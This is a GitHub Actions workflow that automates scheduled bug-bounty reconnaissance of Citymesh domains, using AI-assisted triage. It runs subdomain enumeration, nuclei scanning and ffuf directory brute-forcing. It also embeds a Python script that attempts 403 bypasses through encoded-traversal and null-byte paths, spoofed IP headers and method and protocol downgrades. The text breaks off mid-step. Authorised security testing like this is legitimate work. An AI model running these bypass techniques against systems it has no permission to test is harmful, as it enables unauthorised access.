name: Subdomain Monitor - Citymesh

on:
  schedule:
    - cron: '0 */6 * * *'   # every 6 hours
  workflow_dispatch:
    inputs:
      smoke_test:
        description: 'Run smoke test only (Discord + AI triage check, no scanning)'
        required: false
        default: 'false'
        type: boolean

permissions:
  contents: write

jobs:
  smoke_test:
    if: github.event_name == 'workflow_dispatch' && inputs.smoke_test == true
    runs-on: ubuntu-latest
    env:
      DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
      GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
      GEMINI_API_KEY_2: ${{ secrets.GEMINI_API_KEY_2 }}
      GEMINI_API_KEY_3: ${{ secrets.GEMINI_API_KEY_3 }}
      COHERE_API_KEY: ${{ secrets.COHERE_API_KEY }}
      COHERE_API_KEY_2: ${{ secrets.COHERE_API_KEY_2 }}
      COHERE_API_KEY_3: ${{ secrets.COHERE_API_KEY_3 }}
    steps:
      - name: Test Discord webhook
        run: |
          CONTENT="Smoke test: Discord webhook is reachable. $(date -u '+%Y-%m-%d %H:%M UTC')"
          PAYLOAD=$(jq -n --arg content "$CONTENT" '{content: $content}')
          HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -H "Content-Type: application/json" -d "$PAYLOAD" "$DISCORD_WEBHOOK_URL")
          echo "Discord response code: $HTTP_CODE"
          if [ "$HTTP_CODE" -lt 200 ] || [ "$HTTP_CODE" -ge 300 ]; then
            echo "::error::Discord webhook returned $HTTP_CODE — check DISCORD_WEBHOOK_URL secret"
            exit 1
          fi

      - name: Test AI triage pipeline (multi-key rotation, Gemini -> Cohere fallback)
        run: |
          PROMPT_TEXT="Reply with exactly one short sentence confirming you received this test message."
          SUMMARY=""
          PROVIDER="none"

          # Try each Gemini key in turn until one succeeds
          for KEY_VAR in GEMINI_API_KEY GEMINI_API_KEY_2 GEMINI_API_KEY_3; do
            KEY_VAL="${!KEY_VAR}"
            [ -z "$KEY_VAL" ] && continue
            GEMINI_PAYLOAD=$(jq -n --arg text "$PROMPT_TEXT" '{contents: [{parts: [{text: $text}]}]}')
            GEMINI_RESPONSE=$(curl -s -X POST \
              "https://generativelanguage.googleapis.com/v1beta/models/gemini-3.8-flash:generateContent?key=$KEY_VAL" \
              -H "Content-Type: application/json" -d "$GEMINI_PAYLOAD")
            SUMMARY=$(echo "$GEMINI_RESPONSE" | jq -r '.candidates[0].content.parts[0].text // empty' 2>/dev/null || echo "")
            echo "Tried $KEY_VAR -> $([ -n "$SUMMARY" ] && echo "success" || echo "failed: $GEMINI_RESPONSE")"
            if [ -n "$SUMMARY" ]; then
              PROVIDER="Gemini ($KEY_VAR)"
              break
            fi
          done

          # Try each Cohere key in turn if every Gemini key failed
          if [ -z "$SUMMARY" ]; then
            for KEY_VAR in COHERE_API_KEY COHERE_API_KEY_2 COHERE_API_KEY_3; do
              KEY_VAL="${!KEY_VAR}"
              [ -z "$KEY_VAL" ] && continue
              COHERE_PAYLOAD=$(jq -n --arg text "$PROMPT_TEXT" '{model: "command-a-03-2025", messages: [{role: "user", content: $text}]}')
              COHERE_RESPONSE=$(curl -s -X POST "https://api.cohere.com/v2/chat" \
                -H "Content-Type: application/json" -H "Authorization: Bearer $KEY_VAL" -d "$COHERE_PAYLOAD")
              SUMMARY=$(echo "$COHERE_RESPONSE" | jq -r '.message.content[0].text // empty' 2>/dev/null || echo "")
              echo "Tried $KEY_VAR -> $([ -n "$SUMMARY" ] && echo "success" || echo "failed: $COHERE_RESPONSE")"
              if [ -n "$SUMMARY" ]; then
                PROVIDER="Cohere ($KEY_VAR, fallback)"
                break
              fi
            done
          fi

          if [ -z "$SUMMARY" ]; then
            SUMMARY="AI triage FAILED — every configured Gemini and Cohere key failed. Check API keys and provider status."
            PROVIDER="none"
          fi

          CONTENT=$(printf "Smoke test — AI triage via **%s**:\n\`\`\`\n%s\n\`\`\`" "$PROVIDER" "$SUMMARY")
          PAYLOAD=$(jq -n --arg content "$CONTENT" '{content: $content}')
          curl -s -H "Content-Type: application/json" -d "$PAYLOAD" "$DISCORD_WEBHOOK_URL"

          echo "SMOKE_PROVIDER=$PROVIDER" >> "$GITHUB_ENV"
          echo "SMOKE_SUMMARY=$SUMMARY" >> "$GITHUB_ENV"

      - name: Write smoke test summary
        if: always()
        run: |
          {
            echo "## Smoke Test Results"
            echo ""
            echo "Run time: $(date -u '+%Y-%m-%d %H:%M UTC')"
            echo ""
            echo "- Discord webhook: reachable (see step above for status code)"
            echo "- AI triage provider that responded: **${SMOKE_PROVIDER:-unknown}**"
            echo ""
            echo "AI response:"
            echo '```'
            echo "${SMOKE_SUMMARY:-no response captured}"
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"

  monitor:
    if: github.event_name != 'workflow_dispatch' || inputs.smoke_test != true
    runs-on: ubuntu-latest
    # environment: production   # uncomment + set name if webhook is an Environment secret
    env:
      DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}

    steps:
      - name: Checkout repo
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Install Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.22'

      - name: Install subfinder, httpx, nuclei, ffuf and katana
        run: |
          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          go install -v github.com/ffuf/ffuf/v2@latest
          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
          echo "$HOME/go/bin" >> $GITHUB_PATH

      - name: Download wordlist for directory bruteforce
        run: |
          mkdir -p wordlists
          curl -s -o wordlists/common.txt \
            https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt

      - name: Write subfinder provider config
        env:
          SHODAN_API_KEY: ${{ secrets.SHODAN_API_KEY }}
          CENSYS_API_ID: ${{ secrets.CENSYS_API_ID }}
          CENSYS_API_SECRET: ${{ secrets.CENSYS_API_SECRET }}
          ZOOMEYE_API_KEY: ${{ secrets.ZOOMEYE_API_KEY }}
          FOFA_EMAIL: ${{ secrets.FOFA_EMAIL }}
          FOFA_KEY: ${{ secrets.FOFA_KEY }}
          NETLAS_API_KEY: ${{ secrets.NETLAS_API_KEY }}
          LEAKIX_API_KEY: ${{ secrets.LEAKIX_API_KEY }}
          CRIMINALIP_API_KEY: ${{ secrets.CRIMINALIP_API_KEY }}
          VIRUSTOTAL_API_KEY: ${{ secrets.VIRUSTOTAL_API_KEY }}
        run: |
          mkdir -p "$HOME/.config/subfinder"
          cat > "$HOME/.config/subfinder/provider-config.yaml" <<EOF
          shodan:
            - $SHODAN_API_KEY
          censys:
            - $CENSYS_API_ID:$CENSYS_API_SECRET
          zoomeye:
            - $ZOOMEYE_API_KEY
          fofa:
            - $FOFA_EMAIL:$FOFA_KEY
          netlas:
            - $NETLAS_API_KEY
          leakix:
            - $LEAKIX_API_KEY
          criminalip:
            - $CRIMINALIP_API_KEY
          virustotal:
            - $VIRUSTOTAL_API_KEY
          EOF

      - name: Run subdomain enumeration across all targets
        run: |
          mkdir -p results
          # Single multi-domain invocation instead of looping subfinder once per
          # domain — each separate invocation pays its own source-connection
          # startup cost (~5-15s), so 41 domains looped serially adds up fast.
          # subfinder's -dL handles internal concurrency across all of them at once.
          subfinder -dL targets.txt -silent -all -o results/current_raw.txt || touch results/current_raw.txt
          sort -u results/current_raw.txt -o results/current_raw.txt

      - name: Filter out-of-scope subdomains
        run: |
          if [ -s excluded.txt ]; then
            grep -v -F -f excluded.txt results/current_raw.txt > results/current.txt || true
          else
            cp results/current_raw.txt results/current.txt
          fi
          sort -u results/current.txt -o results/current.txt

      - name: Probe for live hosts with httpx
        run: |
          # rate-limit kept under Citymesh's 20 req/sec cap
          httpx -l results/current.txt -silent -status-code -title -follow-redirects \
                -rate-limit 15 \
                -o results/current_alive.txt || touch results/current_alive.txt
          sort -u results/current_alive.txt -o results/current_alive.txt

          # Extract hostname-only column (first field) for diffing
          awk '{print $1}' results/current_alive.txt | sort -u > results/current_alive_hosts.txt

      - name: Diff against previous alive hosts
        id: diff
        run: |
          if [ -f results/previous_alive_hosts.txt ]; then
            comm -13 results/previous_alive_hosts.txt results/current_alive_hosts.txt > results/new_hosts.txt
          else
            cp results/current_alive_hosts.txt results/new_hosts.txt
          fi

          NEW_COUNT=$(wc -l < results/new_hosts.txt | tr -d ' ')
          echo "new_count=$NEW_COUNT" >> "$GITHUB_OUTPUT"

          # Pull full detail lines (with status/title) for only the new hosts
          if [ -s results/new_hosts.txt ]; then
            grep -F -f results/new_hosts.txt results/current_alive.txt > results/new_detail.txt
          else
            touch results/new_detail.txt
          fi

      - name: Notify Discord if new live subdomains found
        if: steps.diff.outputs.new_count != '0'
        run: |
          NEW_SUBS=$(cat results/new_detail.txt)
          CONTENT=$(printf "**New live subdomains found for Citymesh:**\n\`\`\`\n%s\n\`\`\`" "$NEW_SUBS")
          PAYLOAD=$(jq -n --arg content "$CONTENT" '{content: $content}')
          curl -s -H "Content-Type: application/json" -d "$PAYLOAD" "$DISCORD_WEBHOOK_URL"

      - name: Update nuclei templates
        run: nuclei -update-templates -silent || true

      - name: Scan live hosts with nuclei
        run: |
          # Conservative template scope for a responsible-disclosure program:
          # exposures, misconfigs, takeovers, default creds, known CVEs.
          # Excludes fuzzing/dos-tagged templates entirely.
          nuclei -l results/current_alive_hosts.txt \
                 -tags exposures,misconfiguration,takeovers,default-logins,cves \
                 -severity low,medium,high,critical \
                 -rate-limit 15 \
                 -silent \
                 -o results/nuclei_current.txt || touch results/nuclei_current.txt
          sort -u results/nuclei_current.txt -o results/nuclei_current.txt

      - name: Diff nuclei findings against previous run
        id: nuclei_diff
        run: |
          if [ -f results/nuclei_previous.txt ]; then
            comm -13 results/nuclei_previous.txt results/nuclei_current.txt > results/nuclei_new.txt
          else
            cp results/nuclei_current.txt results/nuclei_new.txt
          fi

          NEW_FINDINGS=$(wc -l < results/nuclei_new.txt | tr -d ' ')
          echo "new_findings=$NEW_FINDINGS" >> "$GITHUB_OUTPUT"

      - name: AI-triage new nuclei findings
        id: triage
        if: steps.nuclei_diff.outputs.new_findings != '0'
        env:
          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
          GEMINI_API_KEY_2: ${{ secrets.GEMINI_API_KEY_2 }}
          GEMINI_API_KEY_3: ${{ secrets.GEMINI_API_KEY_3 }}
          COHERE_API_KEY: ${{ secrets.COHERE_API_KEY }}
          COHERE_API_KEY_2: ${{ secrets.COHERE_API_KEY_2 }}
          COHERE_API_KEY_3: ${{ secrets.COHERE_API_KEY_3 }}
        run: |
          FINDINGS=$(cat results/nuclei_new.txt)
          INSTRUCTIONS="You are triaging bug bounty / responsible-disclosure scan output for the Citymesh program (no bounty, points/reputation only). Below is nuclei output listing NEW findings from this scan cycle. For each finding, briefly note what it is and whether it looks worth manual follow-up. Group by severity (critical/high first). Flag anything that overlaps with Citymesh's excluded finding categories (e.g. missing headers, verbose errors without sensitive data, CSRF with low impact, disclosed API keys without proven business impact) as LOW PRIORITY / likely not reportable. End with a short list of the top 3 findings worth investigating manually first, or state clearly if nothing looks worth pursuing. Be concise, plain text, no markdown headers."
          PROMPT_TEXT=$(printf "%s\n\nFINDINGS:\n%s" "$INSTRUCTIONS" "$FINDINGS")

          SUMMARY=""
          PROVIDER="none"

          # --- Try each Gemini key in turn ---
          for KEY_VAR in GEMINI_API_KEY GEMINI_API_KEY_2 GEMINI_API_KEY_3; do
            KEY_VAL="${!KEY_VAR}"
            [ -z "$KEY_VAL" ] && continue
            GEMINI_PAYLOAD=$(jq -n --arg text "$PROMPT_TEXT" '{contents: [{parts: [{text: $text}]}]}')
            GEMINI_RESPONSE=$(curl -s -X POST \
              "https://generativelanguage.googleapis.com/v1beta/models/gemini-3.8-flash:generateContent?key=$KEY_VAL" \
              -H "Content-Type: application/json" \
              -d "$GEMINI_PAYLOAD")
            SUMMARY=$(echo "$GEMINI_RESPONSE" | jq -r '.candidates[0].content.parts[0].text // empty' 2>/dev/null || echo "")
            if [ -n "$SUMMARY" ]; then
              PROVIDER="Gemini ($KEY_VAR)"
              break
            fi
          done

          # --- Fall back to each Cohere key in turn if every Gemini key failed ---
          if [ -z "$SUMMARY" ]; then
            for KEY_VAR in COHERE_API_KEY COHERE_API_KEY_2 COHERE_API_KEY_3; do
              KEY_VAL="${!KEY_VAR}"
              [ -z "$KEY_VAL" ] && continue
              COHERE_PAYLOAD=$(jq -n --arg text "$PROMPT_TEXT" \
                '{model: "command-a-03-2025", messages: [{role: "user", content: $text}]}')
              COHERE_RESPONSE=$(curl -s -X POST "https://api.cohere.com/v2/chat" \
                -H "Content-Type: application/json" \
                -H "Authorization: Bearer $KEY_VAL" \
                -d "$COHERE_PAYLOAD")
              SUMMARY=$(echo "$COHERE_RESPONSE" | jq -r '.message.content[0].text // empty' 2>/dev/null || echo "")
              if [ -n "$SUMMARY" ]; then
                PROVIDER="Cohere ($KEY_VAR, fallback)"
                break
              fi
            done
          fi

          echo "AI triage provider used: $PROVIDER"

          # --- Final fallback: raw findings if every key on both providers failed ---
          if [ -z "$SUMMARY" ]; then
            SUMMARY=$(printf "AI triage unavailable this run — raw findings:\n%s" "$(head -c 1200 results/nuclei_new.txt)")
          fi

          echo "$SUMMARY" > results/ai_summary.txt

      - name: Notify Discord if new nuclei findings
        if: steps.nuclei_diff.outputs.new_findings != '0'
        run: |
          # Discord's 2000-char limit: truncate the AI summary if needed
          SUMMARY=$(head -c 1700 results/ai_summary.txt)
          CONTENT=$(printf "**New nuclei findings for Citymesh (AI-triaged):**\n\`\`\`\n%s\n\`\`\`" "$SUMMARY")
          PAYLOAD=$(jq -n --arg content "$CONTENT" '{content: $content}')
          curl -s -H "Content-Type: application/json" -d "$PAYLOAD" "$DISCORD_WEBHOOK_URL"

      - name: AI-prioritize hosts worth fuzzing
        id: prioritize
        env:
          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
          GEMINI_API_KEY_2: ${{ secrets.GEMINI_API_KEY_2 }}
          GEMINI_API_KEY_3: ${{ secrets.GEMINI_API_KEY_3 }}
          COHERE_API_KEY: ${{ secrets.COHERE_API_KEY }}
          COHERE_API_KEY_2: ${{ secrets.COHERE_API_KEY_2 }}
          COHERE_API_KEY_3: ${{ secrets.COHERE_API_KEY_3 }}
        run: |
          # Cap the input list so the prompt stays a reasonable size
          HOSTS_INFO=$(head -n 150 results/current_alive.txt)
          TOTAL_HOSTS=$(wc -l < results/current_alive_hosts.txt | tr -d ' ')

          INSTRUCTIONS="You are prioritizing which live hosts are worth deep directory bruteforcing in a responsible-disclosure recon pipeline. Below is a list of live hosts with their HTTP status code and page title, one per line. Pick the hosts most likely to be real applications, admin panels, APIs, portals, or dashboards worth fuzzing for hidden paths — favor hostnames like auth., api., admin., portal., my., dashboard., app., cabmanager., gateway. Deprioritize and EXCLUDE hosts that look like static marketing pages, CDN/asset hosts, parked domains, pure redirects with no distinct title, or anything clearly not an application. Return ONLY the full URLs to fuzz, one per line, nothing else — no numbering, no explanation, no markdown. Return at most 20 URLs, chosen by likely value."
          PROMPT_TEXT=$(printf "%s\n\nHOSTS:\n%s" "$INSTRUCTIONS" "$HOSTS_INFO")

          AI_OUTPUT=""
          PROVIDER="none"

          for KEY_VAR in GEMINI_API_KEY GEMINI_API_KEY_2 GEMINI_API_KEY_3; do
            KEY_VAL="${!KEY_VAR}"
            [ -z "$KEY_VAL" ] && continue
            GEMINI_PAYLOAD=$(jq -n --arg text "$PROMPT_TEXT" '{contents: [{parts: [{text: $text}]}]}')
            GEMINI_RESPONSE=$(curl -s -X POST \
              "https://generativelanguage.googleapis.com/v1beta/models/gemini-3.8-flash:generateContent?key=$KEY_VAL" \
              -H "Content-Type: application/json" -d "$GEMINI_PAYLOAD")
            AI_OUTPUT=$(echo "$GEMINI_RESPONSE" | jq -r '.candidates[0].content.parts[0].text // empty' 2>/dev/null || echo "")
            if [ -n "$AI_OUTPUT" ]; then
              PROVIDER="Gemini ($KEY_VAR)"
              break
            fi
          done

          if [ -z "$AI_OUTPUT" ]; then
            for KEY_VAR in COHERE_API_KEY COHERE_API_KEY_2 COHERE_API_KEY_3; do
              KEY_VAL="${!KEY_VAR}"
              [ -z "$KEY_VAL" ] && continue
              COHERE_PAYLOAD=$(jq -n --arg text "$PROMPT_TEXT" \
                '{model: "command-a-03-2025", messages: [{role: "user", content: $text}]}')
              COHERE_RESPONSE=$(curl -s -X POST "https://api.cohere.com/v2/chat" \
                -H "Content-Type: application/json" -H "Authorization: Bearer $KEY_VAL" -d "$COHERE_PAYLOAD")
              AI_OUTPUT=$(echo "$COHERE_RESPONSE" | jq -r '.message.content[0].text // empty' 2>/dev/null || echo "")
              if [ -n "$AI_OUTPUT" ]; then
                PROVIDER="Cohere ($KEY_VAR, fallback)"
                break
              fi
            done
          fi

          echo "Prioritization provider: $PROVIDER"

          # Keep only lines that look like real http(s) URLs from the AI's output
          echo "$AI_OUTPUT" | grep -E '^https?://' | sort -u > results/ffuf_targets.txt || true

          # Safety net: if AI failed or returned nothing usable, fall back to
          # the first 15 live hosts so the run still makes progress and finishes.
          FILTERED_COUNT=$(wc -l < results/ffuf_targets.txt | tr -d ' ')
          if [ "$FILTERED_COUNT" = "0" ]; then
            echo "AI prioritization returned nothing usable — falling back to first 15 live hosts"
            head -n 15 results/current_alive_hosts.txt > results/ffuf_targets.txt
            echo "prioritized=false" >> "$GITHUB_OUTPUT"
          else
            echo "prioritized=true" >> "$GITHUB_OUTPUT"
          fi

          echo "Fuzzing $(wc -l < results/ffuf_targets.txt | tr -d ' ') of $TOTAL_HOSTS live hosts"

      - name: Directory bruteforce with ffuf
        run: |
          mkdir -p results/ffuf_tmp
          rm -f results/ffuf_tmp/*

          # Fuzz 4 hosts concurrently at 4 req/sec each (~16/sec combined),
          # comfortably under Citymesh's 20/sec cap but using far more of the
          # allowed budget than one host at a time ever could. Same wordlist,
          # same host list, same match codes as before — only the scheduling
          # changed, so coverage and findings are unaffected.
          #
          # Output as JSON (not -s silent) so each match keeps its host, full
          # URL and status code — without this, findings can't be attributed
          # to a host or triaged (a 200 could be real, or a soft-404 that
          # slipped past calibration; a 401/403 is a different story entirely).
          cat results/ffuf_targets.txt | xargs -P 4 -I{} bash -c '
            host="$1"
            [ -z "$host" ] && exit 0
            safe_name=$(echo "$host" | sha1sum | cut -d" " -f1)
            ffuf -u "${host}/FUZZ" \
                 -w wordlists/common.txt \
                 -mc 200,201,202,204,301,302,307,401,403 \
                 -ac \
                 -rate 4 \
                 -t 15 \
                 -timeout 8 \
                 -s \
                 -o "results/ffuf_tmp/${safe_name}.json" \
                 -of json \
              > /dev/null 2>&1 || true
          ' _ {}

          # Flatten every host's JSON results into "url [status]" lines
          > results/ffuf_current.txt
          for f in results/ffuf_tmp/*.json; do
            [ -f "$f" ] || continue
            jq -r '.results[]? | "\(.url) [\(.status)]"' "$f" 2>/dev/null >> results/ffuf_current.txt || true
          done
          sort -u results/ffuf_current.txt -o results/ffuf_current.txt

          # Flag hosts where matches exceed 60% of the wordlist — near-total
          # coverage almost always means calibration missed a soft-404/catch-all
          # page on that host, not 60%+ of paths genuinely existing.
          WORDLIST_SIZE=$(wc -l < wordlists/common.txt | tr -d ' ')
          THRESHOLD=$((WORDLIST_SIZE * 60 / 100))
          > results/ffuf_suspect_hosts.txt
          for f in results/ffuf_tmp/*.json; do
            [ -f "$f" ] || continue
            COUNT=$(jq '.results | length' "$f" 2>/dev/null || echo 0)
            if [ "$COUNT" -gt "$THRESHOLD" ]; then
              HOST_URL=$(jq -r '.config.url // "unknown"' "$f" 2>/dev/null)
              echo "$HOST_URL — $COUNT/$WORDLIST_SIZE matched (likely soft-404, calibration missed it)" >> results/ffuf_suspect_hosts.txt
            fi
          done

      - name: Diff ffuf findings against previous run
        id: ffuf_diff
        run: |
          if [ -f results/ffuf_previous.txt ]; then
            comm -13 results/ffuf_previous.txt results/ffuf_current.txt > results/ffuf_new.txt
          else
            cp results/ffuf_current.txt results/ffuf_new.txt
          fi
          NEW_PATHS=$(wc -l < results/ffuf_new.txt | tr -d ' ')
          echo "new_paths=$NEW_PATHS" >> "$GITHUB_OUTPUT"

      - name: Notify Discord if new paths found
        if: steps.ffuf_diff.outputs.new_paths != '0'
        run: |
          PATHS=$(head -c 1500 results/ffuf_new.txt)
          CONTENT=$(printf "**New paths found via directory bruteforce (Citymesh):**\n\`\`\`\n%s\n\`\`\`" "$PATHS")
          PAYLOAD=$(jq -n --arg content "$CONTENT" '{content: $content}')
          curl -s -H "Content-Type: application/json" -d "$PAYLOAD" "$DISCORD_WEBHOOK_URL"

      - name: Notify Discord if any host looks like a soft-404 false-positive source
        if: hashFiles('results/ffuf_suspect_hosts.txt') != ''
        run: |
          if [ -s results/ffuf_suspect_hosts.txt ]; then
            SUSPECTS=$(cat results/ffuf_suspect_hosts.txt)
            CONTENT=$(printf "**Warning: possible soft-404 false positives (Citymesh ffuf run):**\nThese hosts matched over 60%% of the wordlist — likely a catch-all page, not real paths. Treat their findings as unreliable until manually checked.\n\`\`\`\n%s\n\`\`\`" "$SUSPECTS")
            PAYLOAD=$(jq -n --arg content "$CONTENT" '{content: $content}')
            curl -s -H "Content-Type: application/json" -d "$PAYLOAD" "$DISCORD_WEBHOOK_URL"
          fi

      - name: Attempt 403 bypass on restricted paths found
        run: |
          # Only probes paths ffuf already flagged as 401/403 — not a new broad
          # scan. Techniques below are the standard published set (path
          # encoding/case tricks, header spoofing, safe HTTP methods, protocol
          # downgrade, passive Wayback Machine lookup).
          #
          # Deliberately EXCLUDED vs. the full published technique list, and why:
          #  - PUT/DELETE/PATCH/POST/MKCOL/COPY/MOVE/LOCK/UNLOCK/CONNECT: these
          #    can create, modify or delete server state. Citymesh's rules
          #    explicitly forbid "change of system settings or conducting
          #    delete operations" — so only read-only methods are tested
          #    (OPTIONS, HEAD, TRACE, PROPFIND, SEARCH).
          #  - JWT tampering: needs a real token from an authenticated session
          #    tied to a specific app; not something to blindly automate
          #    against arbitrary 403 paths with no context.
          #  - Proxy/VPN IP rotation: this runs from a fixed GitHub Actions
          #    runner IP — only the header-spoofing variant (X-Forwarded-For
          #    etc., already included) is meaningful here.
          #  - Alternate subdomains/ports: guessing new hosts at scale
          #    reintroduces the same enumeration concerns already handled by
          #    the subfinder stage, and risks probing hosts/ports outside the
          #    prioritized list. Worth doing manually on a promising finding.
          cat > bypass_check.py << 'PYEOF'
          import urllib.request, urllib.error, http.client, urllib.parse, time, json

          TIMEOUT = 8
          DELAY = 0.3
          UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

          # Read-only HTTP methods only — see exclusions above for why the
          # state-changing verbs from the article aren't tested here.
          SAFE_METHODS = ["OPTIONS", "HEAD", "TRACE", "PROPFIND", "SEARCH"]


          def request_status(url, method="GET", headers=None, timeout=TIMEOUT):
              hdrs = {"User-Agent": UA}
              if headers:
                  hdrs.update(headers)
              try:
                  req = urllib.request.Request(url, method=method, headers=hdrs)
                  with urllib.request.urlopen(req, timeout=timeout) as r:
                      return r.status
              except urllib.error.HTTPError as e:
                  return e.code
              except Exception:
                  return None


          def http10_status(url, timeout=TIMEOUT):
              # HTTP/1.0 downgrade — some servers apply access rules only under 1.1+
              try:
                  parsed = urllib.parse.urlparse(url)
                  conn_cls = http.client.HTTPSConnection if parsed.scheme == "https" else http.client.HTTPConnection
                  port = parsed.port or (443 if parsed.scheme == "https" else 80)
                  conn = conn_cls(parsed.hostname, port, timeout=timeout)
                  conn._http_vsn = 10
                  conn._http_vsn_str = "HTTP/1.0"
                  path = parsed.path or "/"
                  if parsed.query:
                      path += "?" + parsed.query
                  conn.request("GET", path, headers={"User-Agent": UA, "Host": parsed.hostname})
                  resp = conn.getresponse()
                  status = resp.status
                  conn.close()
                  return status
              except Exception:
                  return None


          def wayback_snapshot(url):
              # Passive only — queries archive.org, never touches the target,
              # so it doesn't count against Citymesh's rate limit at all.
              try:
                  api = "https://archive.org/wayback/available?url=" + urllib.parse.quote(url, safe="")
                  req = urllib.request.Request(api, headers={"User-Agent": UA})
                  with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
                      data = json.loads(r.read().decode("utf-8", "ignore"))
                  snap = (data.get("archived_snapshots") or {}).get("closest")
                  if snap and snap.get("available"):
                      return snap.get("url")
              except Exception:
                  pass
              return None


          def split_url(url):
              scheme_sep = url.find("://") + 3
              host_end = url.find("/", scheme_sep)
              if host_end == -1:
                  return url, "/"
              return url[:host_end], url[host_end:]


          def build_path_variants(url):
              base, path = split_url(url)
              if not path.startswith("/"):
                  path = "/" + path
              trimmed = path.rstrip("/")
              last_seg = trimmed.rsplit("/", 1)[-1] if trimmed else ""
              parent = trimmed[: -len(last_seg)] if last_seg else trimmed

              variants = [
                  # trailing slash / dot / whitespace tricks
                  path + "/",
                  path.rstrip("/"),
                  trimmed + ".",
                  trimmed + "%20",
                  trimmed + "%2e",
                  # encoded traversal / slash tricks
                  "/%2e%2e" + trimmed,
                  "/%2e%2e%2f" + last_seg if last_seg else path,
                  "/%2e%2e/%2e%2e" + trimmed,
                  trimmed + "%2f",
                  trimmed.replace("/", "//", 1),
                  trimmed + "%252f",
                  # semicolon / path-parameter confusion (Tomcat-style)
                  parent + "..;/" + last_seg if last_seg else path,
                  "/..;" + trimmed,
                  # unicode slash bypasses
                  trimmed + "%c0%af",
                  trimmed + "%ef%bc%8f",
                  # null byte truncation (mostly legacy stacks, cheap to try)
                  trimmed + "%00.html",
                  trimmed + "%00.json",
              ]

              # common extensions — trimmed set to bound request volume
              for ext in [".json", ".html", ".php", ".bak", ".old"]:
                  variants.append(trimmed + ext)

              # case manipulation on the last path segment only
              if last_seg:
                  for cased in {last_seg.upper(), last_seg.lower(), last_seg.swapcase()}:
                      if cased != last_seg:
                          variants.append(parent + cased)

              # query parameter tampering (path unchanged, params appended)
              for param in ["unused_param=1", "debug=true", "access=granted", "redirect=allowed"]:
                  variants.append(path + "?" + param)

              seen = set()
              out = []
              for v in variants:
                  full = base + v if not v.startswith("http") else v
                  if full not in seen:
                      seen.add(full)
                      out.append(full)
              return base, path, out


          def build_header_variants(url):
              _, path = split_url(url)
              return [
                  {"X-Original-URL": path},
                  {"X-Rewrite-URL": path},
                  {"X-Forwarded-For": "127.0.0.1"},
                  {"X-Forwarded-Host": "127.0.0.1"},
                  {"X-Custom-IP-Authorization": "127.0.0.1"},
                  {"X-Client-IP": "127.0.0.1"},
                  {"True-Client-IP": "127.0.0.1"},
                  {"X-Real-IP": "127.0.0.1"},
                  {"X-Host": "localhost"},
                  {"Referer": url},
              ]


          def try_target(url):
              # Returns a finding string if any technique succeeds, else None.
              # Order runs cheapest/likely-first so a hit exits early.

              # 1) header spoofing
              for hdrs in build_header_variants(url):
                  code = request_status(url, method="GET", headers=hdrs)
                  time.sleep(DELAY)
                  if code and 200 <= code < 300:
                      hdr_str = ", ".join(f"{k}: {v}" for k, v in hdrs.items())
                      return f"{url} -> bypass via header [{hdr_str}] returned {code}"

              # 2) path encoding / case / extension / query tricks
              base, path, variants = build_path_variants(url)
              for variant_url in variants:
                  code = request_status(variant_url, method="GET")
                  time.sleep(DELAY)
                  if code and 200 <= code < 300:
                      return f"{url} -> bypass via path variant '{variant_url}' returned {code}"

              # 3) safe read-only method tampering
              for method in SAFE_METHODS:
                  code = request_status(url, method=method)
                  time.sleep(DELAY)
                  if code and 200 <= code < 300:
                      return f"{url} -> bypass via method {method} returned {code}"

              # 4) scheme downgrade (https -> http) on the same host+path
              if url.startswith("https://"):
                  http_url = "http://" + url[len("https://"):]
                  code = request_status(http_url, method="GET")
                  time.sleep(DELAY)
                  if code and 200 <= code < 300:
                      return f"{url} -> bypass via HTTP downgrade '{http_url}' returned {code}"

              # 5) HTTP/1.0 protocol downgrade
              code = http10_status(url)
              time.sleep(DELAY)
              if code and 200 <= code < 300:
                  return f"{url} -> bypass via HTTP/1.0 downgrade returned {code}"

              # 6) passive Wayback Machine check — zero requests to the target
              snap = wayback_snapshot(url)
              if snap:
                  return f"{url} -> historical snapshot available on Wayback Machine: {snap}"

              return None


          def main():
              findings = []
              with open("results/ffuf_current.txt") as f:
                  lines = [l.strip() for l in f if l.strip()]

              targets = []
              for line in lines:
                  if line.endswith("[401]") or line.endswith("[403]"):
                      targets.append(line.rsplit(" [", 1)[0])
              targets = targets[:20]  # cap request volume per run

              for url in targets:
                  result = try_target(url)
                  if result:
                      findings.append(result)

              with open("results/bypass_current.txt", "w") as out:
                  for f in sorted(set(findings)):
                      out.write(f + "\n")


          if __name__ == "__main__":
              main()
          PYEOF

          python3 bypass_check.py
          sort -u results/bypass_current.txt -o results/bypass_current.txt 2>/dev/null || touch results/bypass_current.txt
      - name: Diff 403 bypass findings against previous run
        id: bypass_diff
        run: |
          if [ -f results/bypass_previous.txt ]; then
            comm -13 results/bypass_previous.txt results/bypass_current.txt > results/bypass_new.txt
          else
            cp results/bypass_current.txt results/bypass_new.txt
          fi
          NEW_BYPASSES=$(wc -l < results/bypass_new.txt | tr -d ' ')
          echo "new_bypasses=$NEW_BYPASSES" >> "$GITHUB_OUTPUT"

      - name: Notify Discord if new 403 bypass found
        if: steps.bypass_diff.outputs.new_bypasses != '0'
        run: |
          BYPASSES=$(head -c 1700 results/bypass_new.txt)
          CONTENT=$(printf "**403 bypass succeeded (Citymesh) — verify manually before reporting:**\n\`\`\`\n%s\n\`\`\`" "$BYPASSES")
          PAYLOAD=$(jq -n --arg content "$CONTENT" '{content: $content}')
          curl -s -H "Content-Type: application/json" -d "$PAYLOAD" "$DISCORD_WEBHOOK_URL"

      - name: Discover JS files with katana
        run: |
          katana -list results/current_alive_hosts.txt \
